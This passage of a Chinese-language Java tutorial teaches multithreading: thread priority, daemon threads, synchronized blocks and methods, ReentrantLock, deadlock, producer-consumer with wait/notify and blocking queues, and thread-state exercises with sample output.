更改此线程的优先级线程默认优先级是5；线程优先级的范围是：1-10 |\n\n- 代码演示\n\n  ```java\n  public class MyCallable implements Callable<String> {\n      @Override\n      public String call() throws Exception {\n          for (int i = 0; i < 100; i++) {\n              System.out.println(Thread.currentThread().getName() + "---" + i);\n          }\n          return "线程执行完毕了";\n      }\n  }\n  public class Demo {\n      public static void main(String[] args) {\n          //优先级: 1 - 10 默认值:5\n          MyCallable mc = new MyCallable();\n\n          FutureTask<String> ft = new FutureTask<>(mc);\n\n          Thread t1 = new Thread(ft);\n          t1.setName("飞机");\n          t1.setPriority(10);\n          //System.out.println(t1.getPriority());//5\n          t1.start();\n\n          MyCallable mc2 = new MyCallable();\n\n          FutureTask<String> ft2 = new FutureTask<>(mc2);\n\n          Thread t2 = new Thread(ft2);\n          t2.setName("坦克");\n          t2.setPriority(1);\n          //System.out.println(t2.getPriority());//5\n          t2.start();\n      }\n  }\n  ```\n\n### 1.10守护线程【应用】\n\n- 相关方法\n\n  | 方法名                        | 说明                                   |\n  | -------------------------- | ------------------------------------ |\n  | void setDaemon(boolean on) | 将此线程标记为守护线程，当运行的线程都是守护线程时，Java虚拟机将退出 |\n\n- 代码演示\n\n  ```java\n  public class MyThread1 extends Thread {\n      @Override\n      public void run() {\n          for (int i = 0; i < 10; i++) {\n              System.out.println(getName() + "---" + i);\n          }\n      }\n  }\n  public class MyThread2 extends Thread {\n      @Override\n      public void run() {\n          for (int i = 0; i < 100; i++) {\n              System.out.println(getName() + "---" + i);\n          }\n      }\n  }\n  public class Demo {\n      public static void main(String[] args) {\n          MyThread1 t1 = new MyThread1();\n          MyThread2 t2 = new MyThread2();\n\n          t1.setName("女神");\n          t2.setName("备胎");\n\n          //把第二个线程设置为守护线程\n          //当普通线程执行完之后,那么守护线程也没有继续运行下去的必要了.\n          t2.setDaemon(true);\n\n          t1.start();\n          t2.start();\n      }\n  }\n  ```\n\n## 2.线程同步\n\n### 2.1卖票【应用】\n\n- 案例需求\n\n  某电影院目前正在上映国产大片，共有100张票，而它有3个窗口卖票，请设计一个程序模拟该电影院卖票\n\n- 实现步骤\n\n  - 定义一个类SellTicket实现Runnable接口，里面定义一个成员变量：private int tickets = 100;\n\n  - 在SellTicket类中重写run()方法实现卖票，代码步骤如下\n\n  - 判断票数大于0，就卖票，并告知是哪个窗口卖的\n  - 卖了票之后，总票数要减1\n  - 票卖没了，线程停止\n  - 定义一个测试类SellTicketDemo，里面有main方法，代码步骤如下\n  - 创建SellTicket类的对象\n  - 创建三个Thread类的对象，把SellTicket对象作为构造方法的参数，并给出对应的窗口名称\n  - 启动线程\n\n- 代码实现\n\n  ```java\n  public class SellTicket implements Runnable {\n      private int tickets = 100;\n      //在SellTicket类中重写run()方法实现卖票，代码步骤如下\n      @Override\n      public void run() {\n          while (true) {\n              if(ticket <= 0){\n                      //卖完了\n                      break;\n                  }else{\n                      try {\n                          Thread.sleep(100);\n                      } catch (InterruptedException e) {\n                          e.printStackTrace();\n                      }\n                      ticket--;\n                      System.out.println(Thread.currentThread().getName() + "在卖票,还剩下" + ticket + "张票");\n                  }\n          }\n      }\n  }\n  public class SellTicketDemo {\n      public static void main(String[] args) {\n          //创建SellTicket类的对象\n          SellTicket st = new SellTicket();\n\n          //创建三个Thread类的对象，把SellTicket对象作为构造方法的参数，并给出对应的窗口名称\n          Thread t1 = new Thread(st,"窗口1");\n          Thread t2 = new Thread(st,"窗口2");\n          Thread t3 = new Thread(st,"窗口3");\n\n          //启动线程\n          t1.start();\n          t2.start();\n          t3.start();\n      }\n  }\n  ```\n\n\n### 2.2卖票案例的问题【理解】\n\n- 卖票出现了问题\n\n  - 相同的票出现了多次\n\n  - 出现了负数的票\n\n- 问题产生原因\n\n  线程执行的随机性导致的,可能在卖票过程中丢失cpu的执行权,导致出现问题\n\n\n### 2.3同步代码块解决数据安全问题【应用】\n\n- 安全问题出现的条件\n\n  - 是多线程环境\n\n  - 有共享数据\n\n  - 有多条语句操作共享数据\n\n- 如何解决多线程安全问题呢?\n\n  - 基本思想：让程序没有安全问题的环境\n\n- 怎么实现呢?\n\n  - 把多条语句操作共享数据的代码给锁起来，让任意时刻只能有一个线程执行即可\n\n  - Java提供了同步代码块的方式来解决\n\n- 同步代码块格式：\n\n  ```java\n  synchronized(任意对象) { \n  \t多条语句操作共享数据的代码 \n  }\n  ```\n\n  synchronized(任意对象)：就相当于给代码加锁了，任意对象就可以看成是一把锁\n\n- 同步的好处和弊端  \n\n  - 好处：解决了多线程的数据安全问题\n\n  - 弊端：当线程很多时，因为每个线程都会去判断同步上的锁，这是很耗费资源的，无形中会降低程序的运行效率\n\n- 代码演示\n\n  ```java\n  public class SellTicket implements Runnable {\n      private int tickets = 100;\n      private Object obj = new Object();\n\n      @Override\n      public void run() {\n          while (true) {\n              synchronized (obj) { // 对可能有安全问题的代码加锁,多个线程必须使用同一把锁\n                  //t1进来后，就会把这段代码给锁起来\n                  if (tickets > 0) {\n                      try {\n                          Thread.sleep(100);\n                          //t1休息100毫秒\n                      } catch (InterruptedException e) {\n                          e.printStackTrace();\n                      }\n                      //窗口1正在出售第100张票\n                      System.out.println(Thread.currentThread().getName() + "正在出售第" + tickets + "张票");\n                      tickets--; //tickets = 99;\n                  }\n              }\n              //t1出来了，这段代码的锁就被释放了\n          }\n      }\n  }\n\n  public class SellTicketDemo {\n      public static void main(String[] args) {\n          SellTicket st = new SellTicket();\n\n          Thread t1 = new Thread(st, "窗口1");\n          Thread t2 = new Thread(st, "窗口2");\n          Thread t3 = new Thread(st, "窗口3");\n\n          t1.start();\n          t2.start();\n          t3.start();\n      }\n  }\n  ```\n\n### 2.4同步方法解决数据安全问题【应用】\n\n- 同步方法的格式\n\n  同步方法：就是把synchronized关键字加到方法上\n\n  ```java\n  修饰符 synchronized 返回值类型 方法名(方法参数) { \n  \t方法体；\n  }\n  ```\n\n  同步方法的锁对象是什么呢?\n\n  ​\tthis\n\n- 静态同步方法\n\n  同步静态方法：就是把synchronized关键字加到静态方法上\n\n  ```java\n  修饰符 static synchronized 返回值类型 方法名(方法参数) { \n  \t方法体；\n  }\n  ```\n\n  同步静态方法的锁对象是什么呢?\n\n  ​\t类名.class\n\n- 代码演示\n\n  ```java\n  public class MyRunnable implements Runnable {\n      private static int ticketCount = 100;\n\n      @Override\n      public void run() {\n          while(true){\n              if("窗口一".equals(Thread.currentThread().getName())){\n                  //同步方法\n                  boolean result = synchronizedMthod();\n                  if(result){\n                      break;\n                  }\n              }\n\n              if("窗口二".equals(Thread.currentThread().getName())){\n                  //同步代码块\n                  synchronized (MyRunnable.class){\n                      if(ticketCount == 0){\n                         break;\n                      }else{\n                          try {\n                              Thread.sleep(10);\n                          } catch (InterruptedException e) {\n                              e.printStackTrace();\n                          }\n                          ticketCount--;\n                          System.out.println(Thread.currentThread().getName() + "在卖票,还剩下" + ticketCount + "张票");\n                      }\n                  }\n              }\n\n          }\n      }\n\n      private static synchronized boolean synchronizedMthod() {\n          if(ticketCount == 0){\n              return true;\n          }else{\n              try {\n                  Thread.sleep(10);\n              } catch (InterruptedException e) {\n                  e.printStackTrace();\n              }\n              ticketCount--;\n              System.out.println(Thread.currentThread().getName() + "在卖票,还剩下" + ticketCount + "张票");\n              return false;\n          }\n      }\n  }\n\n\n  public class Demo {\n      public static void main(String[] args) {\n          MyRunnable mr = new MyRunnable();\n\n          Thread t1 = new Thread(mr);\n          Thread t2 = new Thread(mr);\n\n          t1.setName("窗口一");\n          t2.setName("窗口二");\n\n          t1.start();\n          t2.start();\n      }\n  }\n  ```\n\n\n### 2.5Lock锁【应用】\n\n虽然我们可以理解同步代码块和同步方法的锁对象问题，但是我们并没有直接看到在哪里加上了锁，在哪里释放了锁，为了更清晰的表达如何加锁和释放锁，JDK5以后提供了一个新的锁对象Lock\n\nLock是接口不能直接实例化，这里采用它的实现类ReentrantLock来实例化\n\n- ReentrantLock构造方法\n\n  | 方法名             | 说明                   |\n  | --------------- | -------------------- |\n  | ReentrantLock() | 创建一个ReentrantLock的实例 |\n\n- 加锁解锁方法\n\n  | 方法名           | 说明   |\n  | ------------- | ---- |\n  | void lock()   | 获得锁  |\n  | void unlock() | 释放锁  |\n\n- 代码演示\n\n  ```java\n  public class Ticket implements Runnable {\n      //票的数量\n      private int ticket = 100;\n      private Object obj = new Object();\n      private ReentrantLock lock = new ReentrantLock();\n\n      @Override\n      public void run() {\n          while (true) {\n              //synchronized (obj){//多个线程必须使用同一把锁.\n              try {\n                  lock.lock();\n                  if (ticket <= 0) {\n                      //卖完了\n                      break;\n                  } else {\n                      Thread.sleep(100);\n                      ticket--;\n                      System.out.println(Thread.currentThread().getName() + "在卖票,还剩下" + ticket + "张票");\n                  }\n              } catch (InterruptedException e) {\n                  e.printStackTrace();\n              } finally {\n                  lock.unlock();\n              }\n              // }\n          }\n      }\n  }\n\n  public class Demo {\n      public static void main(String[] args) {\n          Ticket ticket = new Ticket();\n\n          Thread t1 = new Thread(ticket);\n          Thread t2 = new Thread(ticket);\n          Thread t3 = new Thread(ticket);\n\n          t1.setName("窗口一");\n          t2.setName("窗口二");\n          t3.setName("窗口三");\n\n          t1.start();\n          t2.start();\n          t3.start();\n      }\n  }\n  ```\n\n### 2.6死锁【理解】\n\n+ 概述\n\n  线程死锁是指由于两个或者多个线程互相持有对方所需要的资源，导致这些线程处于等待状态，无法前往执行\n\n+ 什么情况下会产生死锁\n\n  1. 资源有限\n  2. 同步嵌套\n\n+ 代码演示\n\n  ```java\n  public class Demo {\n      public static void main(String[] args) {\n          Object objA = new Object();\n          Object objB = new Object();\n\n          new Thread(()->{\n              while(true){\n                  synchronized (objA){\n                      //线程一\n                      synchronized (objB){\n                          System.out.println("小康同学正在走路");\n                      }\n                  }\n              }\n          }).start();\n\n          new Thread(()->{\n              while(true){\n                  synchronized (objB){\n                      //线程二\n                      synchronized (objA){\n                          System.out.println("小薇同学正在走路");\n                      }\n                  }\n              }\n          }).start();\n      }\n  }\n  ```\n\n## 3.生产者消费者\n\n### 3.1生产者和消费者模式概述【应用】\n\n- 概述\n\n  生产者消费者模式是一个十分经典的多线程协作的模式，弄懂生产者消费者问题能够让我们对多线程编程的理解更加深刻。\n\n  所谓生产者消费者问题，实际上主要是包含了两类线程：\n\n  ​\t一类是生产者线程用于生产数据\n\n  ​\t一类是消费者线程用于消费数据\n\n  为了解耦生产者和消费者的关系，通常会采用共享的数据区域，就像是一个仓库\n\n  生产者生产数据之后直接放置在共享数据区中，并不需要关心消费者的行为\n\n  消费者只需要从共享数据区中去获取数据，并不需要关心生产者的行为\n\n- Object类的等待和唤醒方法\n\n  | 方法名              | 说明                                       |\n  | ---------------- | ---------------------------------------- |\n  | void wait()      | 导致当前线程等待，直到另一个线程调用该对象的 notify()方法或 notifyAll()方法 |\n  | void notify()    | 唤醒正在等待对象监视器的单个线程                         |\n  | void notifyAll() | 唤醒正在等待对象监视器的所有线程                         |\n\n### 3.2生产者和消费者案例【应用】\n\n- 案例需求\n\n  + 桌子类(Desk)：定义表示包子数量的变量,定义锁对象变量,定义标记桌子上有无包子的变量\n\n  + 生产者类(Cooker)：实现Runnable接口，重写run()方法，设置线程任务\n\n      1.判断是否有包子,决定当前线程是否执行\n\n      2.如果有包子,就进入等待状态,如果没有包子,继续执行,生产包子\n\n      3.生产包子之后,更新桌子上包子状态,唤醒消费者消费包子\n\n  + 消费者类(Foodie)：实现Runnable接口，重写run()方法，设置线程任务\n\n      1.判断是否有包子,决定当前线程是否执行\n\n      2.如果没有包子,就进入等待状态,如果有包子,就消费包子\n\n      3.消费包子后,更新桌子上包子状态,唤醒生产者生产包子\n\n  + 测试类(Demo)：里面有main方法，main方法中的代码步骤如下\n\n      创建生产者线程和消费者线程对象\n\n      分别开启两个线程\n\n- 代码实现\n\n  ```java\n  public class Desk {\n\n      //定义一个标记\n      //true 就表示桌子上有汉堡包的,此时允许吃货执行\n      //false 就表示桌子上没有汉堡包的,此时允许厨师执行\n      public static boolean flag = false;\n\n      //汉堡包的总数量\n      public static int count = 10;\n\n      //锁对象\n      public static final Object lock = new Object();\n  }\n\n  public class Cooker extends Thread {\n  //    生产者步骤：\n  //            1，判断桌子上是否有汉堡包\n  //    如果有就等待，如果没有才生产。\n  //            2，把汉堡包放在桌子上。\n  //            3，叫醒等待的消费者开吃。\n      @Override\n      public void run() {\n          while(true){\n              synchronized (Desk.lock){\n                  if(Desk.count == 0){\n                      break;\n                  }else{\n                      if(!Desk.flag){\n                          //生产\n                          System.out.println("厨师正在生产汉堡包");\n                          Desk.flag = true;\n                          Desk.lock.notifyAll();\n                      }else{\n                          try {\n                              Desk.lock.wait();\n                          } catch (InterruptedException e) {\n                              e.printStackTrace();\n                          }\n                      }\n                  }\n              }\n          }\n      }\n  }\n\n  public class Foodie extends Thread {\n      @Override\n      public void run() {\n  //        1，判断桌子上是否有汉堡包。\n  //        2，如果没有就等待。\n  //        3，如果有就开吃\n  //        4，吃完之后，桌子上的汉堡包就没有了\n  //                叫醒等待的生产者继续生产\n  //        汉堡包的总数量减一\n\n          //套路:\n              //1. while(true)死循环\n              //2. synchronized 锁,锁对象要唯一\n              //3. 判断,共享数据是否结束. 结束\n              //4. 判断,共享数据是否结束. 没有结束\n          while(true){\n              synchronized (Desk.lock){\n                  if(Desk.count == 0){\n                      break;\n                  }else{\n                      if(Desk.flag){\n                          //有\n                          System.out.println("吃货在吃汉堡包");\n                          Desk.flag = false;\n                          Desk.lock.notifyAll();\n                          Desk.count--;\n                      }else{\n                          //没有就等待\n                          //使用什么对象当做锁,那么就必须用这个对象去调用等待和唤醒的方法.\n                          try {\n                              Desk.lock.wait();\n                          } catch (InterruptedException e) {\n                              e.printStackTrace();\n                          }\n                      }\n                  }\n              }\n          }\n\n      }\n  }\n\n  public class Demo {\n      public static void main(String[] args) {\n          /*消费者步骤：\n          1，判断桌子上是否有汉堡包。\n          2，如果没有就等待。\n          3，如果有就开吃\n          4，吃完之后，桌子上的汉堡包就没有了\n                  叫醒等待的生产者继续生产\n          汉堡包的总数量减一*/\n\n          /*生产者步骤：\n          1，判断桌子上是否有汉堡包\n          如果有就等待，如果没有才生产。\n          2，把汉堡包放在桌子上。\n          3，叫醒等待的消费者开吃。*/\n\n          Foodie f = new Foodie();\n          Cooker c = new Cooker();\n\n          f.start();\n          c.start();\n\n      }\n  }\n  ```\n\n### 3.3生产者和消费者案例优化【应用】\n\n+ 需求\n\n  + 将Desk类中的变量,采用面向对象的方式封装起来\n  + 生产者和消费者类中构造方法接收Desk类对象,之后在run方法中进行使用\n  + 创建生产者和消费者线程对象,构造方法中传入Desk类对象\n  + 开启两个线程\n\n+ 代码实现\n\n  ```java\n  public class Desk {\n\n      //定义一个标记\n      //true 就表示桌子上有汉堡包的,此时允许吃货执行\n      //false 就表示桌子上没有汉堡包的,此时允许厨师执行\n      //public static boolean flag = false;\n      private boolean flag;\n\n      //汉堡包的总数量\n      //public static int count = 10;\n      //以后我们在使用这种必须有默认值的变量\n     // private int count = 10;\n      private int count;\n\n      //锁对象\n      //public static final Object lock = new Object();\n      private final Object lock = new Object();\n\n      public Desk() {\n          this(false,10); // 在空参内部调用带参,对成员变量进行赋值,之后就可以直接使用成员变量了\n      }\n\n      public Desk(boolean flag, int count) {\n          this.flag = flag;\n          this.count = count;\n      }\n\n      public boolean isFlag() {\n          return flag;\n      }\n\n      public void setFlag(boolean flag) {\n          this.flag = flag;\n      }\n\n      public int getCount() {\n          return count;\n      }\n\n      public void setCount(int count) {\n          this.count = count;\n      }\n\n      public Object getLock() {\n          return lock;\n      }\n\n      @Override\n      public String toString() {\n          return "Desk{" +\n                  "flag=" + flag +\n                  ", count=" + count +\n                  ", lock=" + lock +\n                  \'}\';\n      }\n  }\n\n  public class Cooker extends Thread {\n\n      private Desk desk;\n\n      public Cooker(Desk desk) {\n          this.desk = desk;\n      }\n  //    生产者步骤：\n  //            1，判断桌子上是否有汉堡包\n  //    如果有就等待，如果没有才生产。\n  //            2，把汉堡包放在桌子上。\n  //            3，叫醒等待的消费者开吃。\n\n      @Override\n      public void run() {\n          while(true){\n              synchronized (desk.getLock()){\n                  if(desk.getCount() == 0){\n                      break;\n                  }else{\n                      //System.out.println("验证一下是否执行了");\n                      if(!desk.isFlag()){\n                          //生产\n                          System.out.println("厨师正在生产汉堡包");\n                          desk.setFlag(true);\n                          desk.getLock().notifyAll();\n                      }else{\n                          try {\n                              desk.getLock().wait();\n                          } catch (InterruptedException e) {\n                              e.printStackTrace();\n                          }\n                      }\n                  }\n              }\n          }\n      }\n  }\n\n  public class Foodie extends Thread {\n      private Desk desk;\n\n      public Foodie(Desk desk) {\n          this.desk = desk;\n      }\n\n      @Override\n      public void run() {\n  //        1，判断桌子上是否有汉堡包。\n  //        2，如果没有就等待。\n  //        3，如果有就开吃\n  //        4，吃完之后，桌子上的汉堡包就没有了\n  //                叫醒等待的生产者继续生产\n  //        汉堡包的总数量减一\n\n          //套路:\n              //1. while(true)死循环\n              //2. synchronized 锁,锁对象要唯一\n              //3. 判断,共享数据是否结束. 结束\n              //4. 判断,共享数据是否结束. 没有结束\n          while(true){\n              synchronized (desk.getLock()){\n                  if(desk.getCount() == 0){\n                      break;\n                  }else{\n                      //System.out.println("验证一下是否执行了");\n                      if(desk.isFlag()){\n                          //有\n                          System.out.println("吃货在吃汉堡包");\n                          desk.setFlag(false);\n                          desk.getLock().notifyAll();\n                          desk.setCount(desk.getCount() - 1);\n                      }else{\n                          //没有就等待\n                          //使用什么对象当做锁,那么就必须用这个对象去调用等待和唤醒的方法.\n                          try {\n                              desk.getLock().wait();\n                          } catch (InterruptedException e) {\n                              e.printStackTrace();\n                          }\n                      }\n                  }\n              }\n          }\n\n      }\n  }\n\n  public class Demo {\n      public static void main(String[] args) {\n          /*消费者步骤：\n          1，判断桌子上是否有汉堡包。\n          2，如果没有就等待。\n          3，如果有就开吃\n          4，吃完之后，桌子上的汉堡包就没有了\n                  叫醒等待的生产者继续生产\n          汉堡包的总数量减一*/\n\n          /*生产者步骤：\n          1，判断桌子上是否有汉堡包\n          如果有就等待，如果没有才生产。\n          2，把汉堡包放在桌子上。\n          3，叫醒等待的消费者开吃。*/\n\n          Desk desk = new Desk();\n\n          Foodie f = new Foodie(desk);\n          Cooker c = new Cooker(desk);\n\n          f.start();\n          c.start();\n\n      }\n  }\n  ```\n\n### 3.4阻塞队列基本使用【理解】\n\n+ 阻塞队列继承结构\n\n  ![06_阻塞队列继承结构](./img/java/basics/day21-多线程01.img/06_阻塞队列继承结构.png)\n\n\n+ 常见BlockingQueue:\n\n   ArrayBlockingQueue: 底层是数组,有界\n\n   LinkedBlockingQueue: 底层是链表,无界.但不是真正的无界,最大为int的最大值\n\n+ BlockingQueue的核心方法:\n\n   put(anObject): 将参数放入队列,如果放不进去会阻塞\n\n   take(): 取出第一个数据,取不到会阻塞\n\n+ 代码示例\n\n  ```java\n  public class Demo02 {\n      public static void main(String[] args) throws Exception {\n          // 创建阻塞队列的对象,容量为 1\n          ArrayBlockingQueue<String> arrayBlockingQueue = new ArrayBlockingQueue<>(1);\n\n          // 存储元素\n          arrayBlockingQueue.put("汉堡包");\n\n          // 取元素\n          System.out.println(arrayBlockingQueue.take());\n          System.out.println(arrayBlockingQueue.take()); // 取不到会阻塞\n\n          System.out.println("程序结束了");\n      }\n  }\n  ```\n\n### 3.5阻塞队列实现等待唤醒机制【理解】\n\n+ 案例需求\n\n  + 生产者类(Cooker)：实现Runnable接口，重写run()方法，设置线程任务\n\n      1.构造方法中接收一个阻塞队列对象\n\n      2.在run方法中循环向阻塞队列中添加包子\n\n      3.打印添加结果\n\n  + 消费者类(Foodie)：实现Runnable接口，重写run()方法，设置线程任务\n\n       1.构造方法中接收一个阻塞队列对象\n\n       2.在run方法中循环获取阻塞队列中的包子\n\n       3.打印获取结果\n\n  + 测试类(Demo)：里面有main方法，main方法中的代码步骤如下\n\n      创建阻塞队列对象\n\n      创建生产者线程和消费者线程对象,构造方法中传入阻塞队列对象\n\n      分别开启两个线程\n\n+ 代码实现\n\n  ```java\n  public class Cooker extends Thread {\n\n      private ArrayBlockingQueue<String> bd;\n\n      public Cooker(ArrayBlockingQueue<String> bd) {\n          this.bd = bd;\n      }\n  //    生产者步骤：\n  //            1，判断桌子上是否有汉堡包\n  //    如果有就等待，如果没有才生产。\n  //            2，把汉堡包放在桌子上。\n  //            3，叫醒等待的消费者开吃。\n\n      @Override\n      public void run() {\n          while (true) {\n              try {\n                  bd.put("汉堡包");\n                  System.out.println("厨师放入一个汉堡包");\n              } catch (InterruptedException e) {\n                  e.printStackTrace();\n              }\n          }\n      }\n  }\n\n  public class Foodie extends Thread {\n      private ArrayBlockingQueue<String> bd;\n\n      public Foodie(ArrayBlockingQueue<String> bd) {\n          this.bd = bd;\n      }\n\n      @Override\n      public void run() {\n  //        1，判断桌子上是否有汉堡包。\n  //        2，如果没有就等待。\n  //        3，如果有就开吃\n  //        4，吃完之后，桌子上的汉堡包就没有了\n  //                叫醒等待的生产者继续生产\n  //        汉堡包的总数量减一\n\n          //套路:\n          //1. while(true)死循环\n          //2. synchronized 锁,锁对象要唯一\n          //3. 判断,共享数据是否结束. 结束\n          //4. 判断,共享数据是否结束. 没有结束\n          while (true) {\n              try {\n                  String take = bd.take();\n                  System.out.println("吃货将" + take + "拿出来吃了");\n              } catch (InterruptedException e) {\n                  e.printStackTrace();\n              }\n          }\n\n      }\n  }\n\n  public class Demo {\n      public static void main(String[] args) {\n          ArrayBlockingQueue<String> bd = new ArrayBlockingQueue<>(1);\n\n          Foodie f = new Foodie(bd);\n          Cooker c = new Cooker(bd);\n\n          f.start();\n          c.start();\n      }\n  }\n  ```\n\n  ​\n\n\n\n',qn='## 1.线程池\n\n### 1.1 线程状态介绍\n\n当线程被创建并启动以后，它既不是一启动就进入了执行状态，也不是一直处于执行状态。线程对象在不同的时期有不同的状态。那么Java中的线程存在哪几种状态呢？Java中的线程\n\n状态被定义在了java.lang.Thread.State枚举类中，State枚举类的源码如下：\n\n```java\npublic class Thread {\n    \n    public enum State {\n    \n        /* 新建 */\n        NEW , \n\n        /* 可运行状态 */\n        RUNNABLE , \n\n        /* 阻塞状态 */\n        BLOCKED , \n\n        /* 无限等待状态 */\n        WAITING , \n\n        /* 计时等待 */\n        TIMED_WAITING , \n\n        /* 终止 */\n        TERMINATED;\n    \n\t}\n    \n    // 获取当前线程的状态\n    public State getState() {\n        return jdk.internal.misc.VM.toThreadState(threadStatus);\n    }\n    \n}\n```\n\n通过源码我们可以看到Java中的线程存在6种状态，每种线程状态的含义如下\n\n| 线程状态          | 具体含义                                     |\n| ------------- | ---------------------------------------- |\n| NEW           | 一个尚未启动的线程的状态。也称之为初始状态、开始状态。线程刚被创建，但是并未启动。还没调用start方法。MyThread t = new MyThread()只有线程象，没有线程特征。 |\n| RUNNABLE      | 当我们调用线程对象的start方法，那么此时线程对象进入了RUNNABLE状态。那么此时才是真正的在JVM进程中创建了一个线程，线程一经启动并不是立即得到执行，线程的运行与否要听令与CPU的调度，那么我们把这个中间状态称之为可执行状态(RUNNABLE)也就是说它具备执行的资格，但是并没有真正的执行起来而是在等待CPU的度。 |\n| BLOCKED       | 当一个线程试图获取一个对象锁，而该对象锁被其他的线程持有，则该线程进入Blocked状态；当该线程持有锁时，该线程将变成Runnable状态。 |\n| WAITING       | 一个正在等待的线程的状态。也称之为等待状态。造成线程等待的原因有两种，分别是调用Object.wait()、join()方法。处于等待状态的线程，正在等待其他线程去执行一个特定的操作。例如：因为wait()而等待的线程正在等待另一个线程去调用notify()或notifyAll()；一个因为join()而等待的线程正在等待另一个线程结束。 |\n| TIMED_WAITING | 一个在限定时间内等待的线程的状态。也称之为限时等待状态。造成线程限时等待状态的原因有三种，分别是：Thread.sleep(long)，Object.wait(long)、join(long)。 |\n| TERMINATED    | 一个完全运行完成的线程的状态。也称之为终止状态、结束状态             |\n\n各个状态的转换，如下图所示：\n\n![1591163781941](./img/java/basics/day22-多线程02.img/1591163781941.png)\n\n### 1.2 线程的状态-练习1\n\n**目的 :** 本案例主要演示TIME_WAITING的状态转换。\n\n**需求：**编写一段代码，依次显示一个线程的这些状态：NEW -> RUNNABLE -> TIME_WAITING -> RUNNABLE -> TERMINATED\n\n为了简化我们的开发，本次我们使用匿名内部类结合lambda表达式的方式使用多线程。\n\n**代码实现**\n\n```java\npublic class ThreadStateDemo01 {\n\n    public static void main(String[] args) throws InterruptedException {\n\n        //定义一个内部线程\n        Thread thread = new Thread(() -> {\n            System.out.println("2.执行thread.start()之后，线程的状态：" + Thread.currentThread().getState());\n            try {\n                //休眠100毫秒\n                Thread.sleep(100);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println("4.执行Thread.sleep(long)完成之后，线程的状态：" + Thread.currentThread().getState());\n        });\n\n        //获取start()之前的状态\n        System.out.println("1.通过new初始化一个线程，但是还没有start()之前，线程的状态：" + thread.getState());\n\n        //启动线程\n        thread.start();\n\n        //休眠50毫秒\n        Thread.sleep(50);\n\n        //因为thread1需要休眠100毫秒，所以在第50毫秒，thread处于sleep状态\n        System.out.println("3.执行Thread.sleep(long)时，线程的状态：" + thread.getState());\n\n        //thread1和main线程主动休眠150毫秒，所以在第150毫秒,thread早已执行完毕\n        Thread.sleep(100);\n\n        System.out.println("5.线程执行完毕之后，线程的状态：" + thread.getState() + "\\n");\n\n    }\n\n}\n```\n\n控制台输出\n\n```java\n1.通过new初始化一个线程，但是还没有start()之前，线程的状态：NEW\n2.执行thread.start()之后，线程的状态：RUNNABLE\n3.执行Thread.sleep(long)时，线程的状态：TIMED_WAITING\n4.执行Thread.sleep(long)完成之后，线程的状态：RUNNABLE\n5.线程执行完毕之后，线程的状态：TERMINATED\n```\n\n### \n\n### 1.3 线程的状态-练习2\n\n**目的 :** 本案例主要演示WAITING的状态转换。\n\n**需求 ：**编写一段代码，依次显示一个线程的这些状态：NEW -> RUNNABLE -> WAITING -> RUNNABLE -> TERMINATED\n\n**代码实现 :** \n\n```java\npublic class ThreadStateDemo02 {\n\n    public static void main(String[] args) throws InterruptedException {\n\n        //定义一个对象，用来加锁和解锁\n        Object obj = new Object();\n\n        //定义一个内部线程\n        Thread thread1 = new Thread(() -> {\n            System.out.println("2.执行thread.start()之后，线程的状态：" + Thread.currentThread().getState());\n            synchronized (obj) {\n                try {\n\n                    //thread1需要休眠100毫秒\n                    Thread.sleep(100);\n\n                    //thread1100毫秒之后，通过wait()方法释放obj对象是锁\n                    obj.wait();\n                    \n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            System.out.println("4.被object.notify()方法唤醒之后，线程的状态：" + Thread.currentThread().getState());\n        });\n\n        //获取start()之前的状态\n        System.out.println("1.通过new初始化一个线程，但是还没有start()之前，线程的状态：" + thread1.getState());\n\n        //启动线程\n        thread1.start();\n\n        //main线程休眠150毫秒\n        Thread.sleep(150);\n\n        //因为thread1在第100毫秒进入wait等待状态，所以第150秒肯定可以获取其状态\n        System.out.println("3.执行object.wait()时，线程的状态：" + thread1.getState());\n\n        //声明另一个线程进行解锁\n        new Thread(() -> {\n            synchronized (obj) {\n                //唤醒等待的线程\n                obj.notify();\n            }\n        }).start();\n\n        //main线程休眠10毫秒等待thread1线程能够苏醒\n        Thread.sleep(10);\n\n        //获取thread1运行结束之后的状态\n        System.out.println("5.线程执行完毕之后，线程的状态：" + thread1.getState() + "\\n");\n\n    }\n\n}\n```\n\n控制台输出结果\n\n```java\n1.通过new初始化一个线程，但是还没有start()之前，线程的状态：NEW\n2.执行thread.start()之后，线程的状态：RUNNABLE\n3.执行object.wait()时，线程的状态：WAITING\n4.被object.notify()方法唤醒之后，线程的状态：RUNNABLE\n5.线程执行完毕之后，线程的状态：TERMINATED\n```\n\n### \n\n### 1.4 线程的状态-练习3\n\n**目的 :**   本案例主要演示BLOCKED的状态转换。\n\n**需求 ：**编写一段代码，依次显示一个线程的这些状态：NEW -> RUNNABLE -> BLOCKED -> RUNNABLE -> TERMINATED\n\n```java\npublic class ThreadStateDemo03 {\n\n    public static void main(String[] args) throws InterruptedException {\n\n        //定义一个对象，用来加锁和解锁\n        Object obj2 = new Object();\n\n        //定义一个线程，先抢占了obj2对象的锁\n        new Thread(() -> {\n            synchronized (obj2) {\n                try {\n                    Thread.sleep(100);              //第一个线程要持有锁100毫秒\n                    obj2.wait();                          //然后通过wait()方法进行等待状态，并释放obj2的对象锁\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }).start();\n\n        //定义目标线程，获取等待获取obj2的锁\n        Thread thread = new Thread(() -> {\n            System.out.println("2.执行thread.start()之后，线程的状态：" + Thread.currentThread().getState());\n            synchronized (obj2) {\n                try {\n                    Thread.sleep(100);              //thread3要持有对象锁100毫秒\n                    obj2.notify();                        //然后通过notify()方法唤醒所有在ojb2上等待的线程继续执行后续操作\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            System.out.println("4.阻塞结束后，线程的状态：" + Thread.currentThread().getState());\n        });\n\n        //获取start()之前的状态\n        System.out.println("1.通过new初始化一个线程，但是还没有thread.start()之前，线程的状态：" + thread.getState());\n\n        //启动线程\n        thread.start();\n\n        //先等100毫秒\n        Thread.sleep(50);\n\n        //第一个线程释放锁至少需要100毫秒，所以在第50毫秒时，thread正在因等待obj的对象锁而阻塞\n        System.out.println("3.因为等待锁而阻塞时，线程的状态：" + thread.getState());\n\n        //再等300毫秒\n        Thread.sleep(300);\n\n        //两个线程的执行时间加上之前等待的50毫秒总共是250毫秒，所以第300毫秒，所有的线程都已经执行完毕\n        System.out.println("5.线程执行完毕之后，线程的状态：" + thread.getState());\n\n    